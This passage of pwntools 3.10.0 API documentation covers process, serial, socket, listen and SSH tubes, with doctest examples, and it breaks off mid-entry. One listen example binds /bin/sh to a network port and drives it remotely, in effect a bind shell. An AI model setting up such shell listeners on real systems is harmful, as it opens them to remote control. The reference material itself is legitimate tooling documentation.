<code class="descname">env</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/process.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.process.process.env" title="Permalink to this definition">¶</a></dt>
<dd><p>Environment passed on envp</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.process.process.executable">
<code class="descname">executable</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/process.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.process.process.executable" title="Permalink to this definition">¶</a></dt>
<dd><p>Full path to the executable</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.process.process.libc">
<code class="descname">libc</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/process.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.process.process.libc" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns an ELF for the libc for the current process.
If possible, it is adjusted to the correct address
automatically.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.process.process.proc">
<code class="descname">proc</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/process.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.process.process.proc" title="Permalink to this definition">¶</a></dt>
<dd><p><cite>subprocess.Popen</cite> object</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.process.process.program">
<code class="descname">program</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/process.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.process.process.program" title="Permalink to this definition">¶</a></dt>
<dd><p>Alias for <code class="docutils literal"><span class="pre">executable</span></code>, for backward compatibility.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;true&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">executable</span> <span class="o">==</span> <span class="s1">&#39;/bin/true&#39;</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">executable</span> <span class="o">==</span> <span class="n">p</span><span class="o">.</span><span class="n">program</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.process.process.pty">
<code class="descname">pty</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/process.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.process.process.pty" title="Permalink to this definition">¶</a></dt>
<dd><p>Which file descriptor is the controlling TTY</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.process.process.raw">
<code class="descname">raw</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/process.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.process.process.raw" title="Permalink to this definition">¶</a></dt>
<dd><p>Whether the controlling TTY is set to raw mode</p>
</dd></dl>

</dd></dl>

</div>
<span id="document-tubes/serial"></span><div class="section" id="module-pwnlib.tubes.serialtube">
<span id="pwnlib-tubes-serialtube-serial-ports"></span><h5><a class="reference internal" href="#module-pwnlib.tubes.serialtube" title="pwnlib.tubes.serialtube"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.tubes.serialtube</span></code></a> &#8212; Serial Ports<a class="headerlink" href="#module-pwnlib.tubes.serialtube" title="Permalink to this headline">¶</a></h5>
<dl class="class">
<dt id="pwnlib.tubes.serialtube.serialtube">
<em class="property">class </em><code class="descclassname">pwnlib.tubes.serialtube.</code><code class="descname">serialtube</code><span class="sig-paren">(</span><em>port=None</em>, <em>baudrate=115200</em>, <em>convert_newlines=True</em>, <em>bytesize=8</em>, <em>parity='N'</em>, <em>stopbits=1</em>, <em>xonxoff=False</em>, <em>rtscts=False</em>, <em>dsrdtr=False</em>, <em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/serialtube.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.serialtube.serialtube" title="Permalink to this definition">¶</a></dt>
<dd></dd></dl>

</div>
<span id="document-tubes/sockets"></span><div class="section" id="module-pwnlib.tubes.sock">
<span id="pwnlib-tubes-sock-sockets"></span><h5><a class="reference internal" href="#module-pwnlib.tubes.sock" title="pwnlib.tubes.sock"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.tubes.sock</span></code></a> &#8212; Sockets<a class="headerlink" href="#module-pwnlib.tubes.sock" title="Permalink to this headline">¶</a></h5>
<dl class="class">
<dt id="pwnlib.tubes.sock.sock">
<em class="property">class </em><code class="descclassname">pwnlib.tubes.sock.</code><code class="descname">sock</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/sock.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.sock.sock" title="Permalink to this definition">¶</a></dt>
<dd><p>Bases: <a class="reference internal" href="index.html#pwnlib.tubes.tube.tube" title="pwnlib.tubes.tube.tube"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.tube.tube</span></code></a></p>
<p>Base type used for <code class="xref py py-class docutils literal"><span class="pre">tubes.remote</span></code> and <code class="xref py py-class docutils literal"><span class="pre">tubes.listen</span></code> classes</p>
</dd></dl>

<span class="target" id="module-pwnlib.tubes.remote"></span><dl class="class">
<dt id="pwnlib.tubes.remote.remote">
<em class="property">class </em><code class="descclassname">pwnlib.tubes.remote.</code><code class="descname">remote</code><span class="sig-paren">(</span><em>host</em>, <em>port</em>, <em>fam='any'</em>, <em>typ='tcp'</em>, <em>ssl=False</em>, <em>sock=None</em>, <em>*args</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/remote.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.remote.remote" title="Permalink to this definition">¶</a></dt>
<dd><p>Bases: <a class="reference internal" href="#pwnlib.tubes.sock.sock" title="pwnlib.tubes.sock.sock"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.sock.sock</span></code></a></p>
<p>Creates a TCP or UDP-connection to a remote host. It supports
both IPv4 and IPv6.</p>
<p>The returned object supports all the methods from
<a class="reference internal" href="#module-pwnlib.tubes.sock" title="pwnlib.tubes.sock"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.sock</span></code></a> and <a class="reference internal" href="index.html#module-pwnlib.tubes.tube" title="pwnlib.tubes.tube"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.tube</span></code></a>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>host</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The host to connect to.</li>
<li><strong>port</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; The port to connect to.</li>
<li><strong>fam</strong> &#8211; The string &#8220;any&#8221;, &#8220;ipv4&#8221; or &#8220;ipv6&#8221; or an integer to pass to <a class="reference external" href="https://docs.python.org/2.7/library/socket.html#socket.getaddrinfo" title="(in Python v2.7)"><code class="xref py py-func docutils literal"><span class="pre">socket.getaddrinfo()</span></code></a>.</li>
<li><strong>typ</strong> &#8211; The string &#8220;tcp&#8221; or &#8220;udp&#8221; or an integer to pass to <a class="reference external" href="https://docs.python.org/2.7/library/socket.html#socket.getaddrinfo" title="(in Python v2.7)"><code class="xref py py-func docutils literal"><span class="pre">socket.getaddrinfo()</span></code></a>.</li>
<li><strong>timeout</strong> &#8211; A positive number, None or the string &#8220;default&#8221;.</li>
<li><strong>ssl</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Wrap the socket with SSL</li>
<li><strong>sock</strong> (<a class="reference internal" href="index.html#pwnlib.shellcraft.i386.linux.socket" title="pwnlib.shellcraft.i386.linux.socket"><em>socket</em></a>) &#8211; Socket to inherit, rather than connecting</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;google.com&#39;</span><span class="p">,</span> <span class="mi">443</span><span class="p">,</span> <span class="n">ssl</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;GET /</span><span class="se">\r\n\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">r</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="go">&#39;HTTP&#39;</span>
</pre></div>
</div>
<p>If a connection cannot be made, an exception is raised.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="gt">Traceback (most recent call last):</span>
<span class="c">...</span>
<span class="gr">PwnlibException</span>: <span class="n">Could not connect to 127.0.0.1 on port 1</span>
</pre></div>
</div>
<p>You can also use <a class="reference internal" href="#pwnlib.tubes.remote.remote.fromsocket" title="pwnlib.tubes.remote.remote.fromsocket"><code class="xref py py-meth docutils literal"><span class="pre">remote.fromsocket()</span></code></a> to wrap an existing socket.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">socket</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s1">&#39;google.com&#39;</span><span class="p">,</span> <span class="mi">80</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;GET /&#39;</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>
<span class="go">9</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="o">.</span><span class="n">fromsocket</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">r</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="go">&#39;HTTP&#39;</span>
</pre></div>
</div>
<dl class="classmethod">
<dt id="pwnlib.tubes.remote.remote.fromsocket">
<em class="property">classmethod </em><code class="descname">fromsocket</code><span class="sig-paren">(</span><em>socket</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/remote.py#L112-126"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.remote.remote.fromsocket" title="Permalink to this definition">¶</a></dt>
<dd><p>Helper method to wrap a standard python socket.socket with the
tube APIs.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>socket</strong> &#8211; Instance of socket.socket</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">Instance of pwnlib.tubes.remote.remote.</td>
</tr>
</tbody>
</table>
</dd></dl>

</dd></dl>

<span class="target" id="module-pwnlib.tubes.listen"></span><dl class="class">
<dt id="pwnlib.tubes.listen.listen">
<em class="property">class </em><code class="descclassname">pwnlib.tubes.listen.</code><code class="descname">listen</code><span class="sig-paren">(</span><em>port=0</em>, <em>bindaddr='0.0.0.0'</em>, <em>fam='any'</em>, <em>typ='tcp'</em>, <em>*args</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/listen.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.listen.listen" title="Permalink to this definition">¶</a></dt>
<dd><p>Bases: <a class="reference internal" href="#pwnlib.tubes.sock.sock" title="pwnlib.tubes.sock.sock"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.sock.sock</span></code></a></p>
<p>Creates an TCP or UDP-socket to receive data on. It supports
both IPv4 and IPv6.</p>
<p>The returned object supports all the methods from
<a class="reference internal" href="#module-pwnlib.tubes.sock" title="pwnlib.tubes.sock"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.sock</span></code></a> and <a class="reference internal" href="index.html#module-pwnlib.tubes.tube" title="pwnlib.tubes.tube"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.tube</span></code></a>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>port</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; The port to connect to.
Defaults to a port auto-selected by the operating system.</li>
<li><strong>bindaddr</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The address to bind to.
Defaults to <code class="docutils literal"><span class="pre">0.0.0.0</span></code> / <cite>::</cite>.</li>
<li><strong>fam</strong> &#8211; The string &#8220;any&#8221;, &#8220;ipv4&#8221; or &#8220;ipv6&#8221; or an integer to pass to <a class="reference external" href="https://docs.python.org/2.7/library/socket.html#socket.getaddrinfo" title="(in Python v2.7)"><code class="xref py py-func docutils literal"><span class="pre">socket.getaddrinfo()</span></code></a>.</li>
<li><strong>typ</strong> &#8211; The string &#8220;tcp&#8221; or &#8220;udp&#8221; or an integer to pass to <a class="reference external" href="https://docs.python.org/2.7/library/socket.html#socket.getaddrinfo" title="(in Python v2.7)"><code class="xref py py-func docutils literal"><span class="pre">socket.getaddrinfo()</span></code></a>.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">l</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="mi">1234</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="n">l</span><span class="o">.</span><span class="n">lport</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">_</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;Hello&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="go">&#39;Hello\n&#39;</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">l</span> <span class="o">=</span> <span class="n">listen</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">spawn_process</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="n">l</span><span class="o">.</span><span class="n">lport</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;echo Goodbye&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="go">&#39;Goodbye\n&#39;</span>
</pre></div>
</div>
<dl class="method">
<dt id="pwnlib.tubes.listen.listen.wait_for_connection">
<code class="descname">wait_for_connection</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/listen.py#L145-148"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.listen.listen.wait_for_connection" title="Permalink to this definition">¶</a></dt>
<dd><p>Blocks until a connection has been established.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.listen.listen.canonname">
<code class="descname">canonname</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/listen.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.listen.listen.canonname" title="Permalink to this definition">¶</a></dt>
<dd><p>Canonical name of the listening interface</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.listen.listen.family">
<code class="descname">family</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/listen.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.listen.listen.family" title="Permalink to this definition">¶</a></dt>
<dd><p>Socket family</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.listen.listen.lhost">
<code class="descname">lhost</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/listen.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.listen.listen.lhost" title="Permalink to this definition">¶</a></dt>
<dd><p>Local host</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.listen.listen.lport">
<code class="descname">lport</code><em class="property"> = 0</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/listen.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.listen.listen.lport" title="Permalink to this definition">¶</a></dt>
<dd><p>Local port</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.listen.listen.protocol">
<code class="descname">protocol</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/listen.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.listen.listen.protocol" title="Permalink to this definition">¶</a></dt>
<dd><p>Socket protocol</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.listen.listen.sockaddr">
<code class="descname">sockaddr</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/listen.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.listen.listen.sockaddr" title="Permalink to this definition">¶</a></dt>
<dd><p>Sockaddr structure that is being listened on</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.listen.listen.type">
<code class="descname">type</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/listen.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.listen.listen.type" title="Permalink to this definition">¶</a></dt>
<dd><p>Socket type (e.g. socket.SOCK_STREAM)</p>
</dd></dl>

</dd></dl>

</div>
<span id="document-tubes/ssh"></span><div class="section" id="module-pwnlib.tubes.ssh">
<span id="pwnlib-tubes-ssh-ssh"></span><h5><a class="reference internal" href="#module-pwnlib.tubes.ssh" title="pwnlib.tubes.ssh"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.tubes.ssh</span></code></a> &#8212; SSH<a class="headerlink" href="#module-pwnlib.tubes.ssh" title="Permalink to this headline">¶</a></h5>
<dl class="class">
<dt id="pwnlib.tubes.ssh.ssh">
<em class="property">class </em><code class="descclassname">pwnlib.tubes.ssh.</code><code class="descname">ssh</code><span class="sig-paren">(</span><em>user</em>, <em>host</em>, <em>port=22</em>, <em>password=None</em>, <em>key=None</em>, <em>keyfile=None</em>, <em>proxy_command=None</em>, <em>proxy_sock=None</em>, <em>level=None</em>, <em>cache=True</em>, <em>ssh_agent=False</em>, <em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh" title="Permalink to this definition">¶</a></dt>
<dd><p>Creates a new ssh connection.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>user</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The username to log in with</li>
<li><strong>host</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The hostname to connect to</li>
<li><strong>port</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; The port to connect to</li>
<li><strong>password</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Try to authenticate using this password</li>
<li><strong>key</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Try to authenticate using this private key. The string should be the actual private key.</li>
<li><strong>keyfile</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Try to authenticate using this private key. The string should be a filename.</li>
<li><strong>proxy_command</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Use this as a proxy command. It has approximately the same semantics as ProxyCommand from ssh(1).</li>
<li><strong>proxy_sock</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Use this socket instead of connecting to the host.</li>
<li><strong>timeout</strong> &#8211; Timeout, in seconds</li>
<li><strong>level</strong> &#8211; Log level</li>
<li><strong>cache</strong> &#8211; Cache downloaded files (by hash/size/timestamp)</li>
<li><strong>ssh_agent</strong> &#8211; If <code class="xref py py-const docutils literal"><span class="pre">True</span></code>, enable usage of keys via ssh-agent</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p>NOTE: The proxy_command and proxy_sock arguments is only available if a
fairly new version of paramiko is used.</p>
<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.checksec">
<code class="descname">checksec</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L1999-2033"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.checksec" title="Permalink to this definition">¶</a></dt>
<dd><p>Prints a helpful message about the remote system.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>banner</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Whether to print the path to the ELF binary.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.close">
<code class="descname">close</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L1277-1282"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.close" title="Permalink to this definition">¶</a></dt>
<dd><p>Close the connection.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.connect_remote">
<code class="descname">connect_remote</code><span class="sig-paren">(</span><em>host</em>, <em>port</em>, <em>timeout = Timeout.default</em><span class="sig-paren">)</span> &#x2192; ssh_connecter<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L1151-1172"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.connect_remote" title="Permalink to this definition">¶</a></dt>
<dd><p>Connects to a host through an SSH connection. This is equivalent to
using the <code class="docutils literal"><span class="pre">-L</span></code> flag on <code class="docutils literal"><span class="pre">ssh</span></code>.</p>
<p>Returns a <a class="reference internal" href="#pwnlib.tubes.ssh.ssh_connecter" title="pwnlib.tubes.ssh.ssh_connecter"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.ssh.ssh_connecter</span></code></a> object.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span> <span class="o">=</span> <span class="n">listen</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span> <span class="o">=</span>  <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;example.pwnme&#39;</span><span class="p">,</span>
<span class="gp">... </span>        <span class="n">user</span><span class="o">=</span><span class="s1">&#39;travis&#39;</span><span class="p">,</span>
<span class="gp">... </span>        <span class="n">password</span><span class="o">=</span><span class="s1">&#39;demopass&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">a</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">connect_remote</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">host</span><span class="p">,</span> <span class="n">l</span><span class="o">.</span><span class="n">lport</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">b</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">a</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;Hello&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="nb">repr</span><span class="p">(</span><span class="n">b</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
<span class="go">&#39;Hello\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.connected">
<code class="descname">connected</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L1261-1275"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.connected" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns True if we are connected.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">s</span> <span class="o">=</span>  <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;example.pwnme&#39;</span><span class="p">,</span>
<span class="gp">... </span>        <span class="n">user</span><span class="o">=</span><span class="s1">&#39;travis&#39;</span><span class="p">,</span>
<span class="gp">... </span>        <span class="n">password</span><span class="o">=</span><span class="s1">&#39;demopass&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">connected</span><span class="p">()</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">connected</span><span class="p">()</span>
<span class="go">False</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.download">
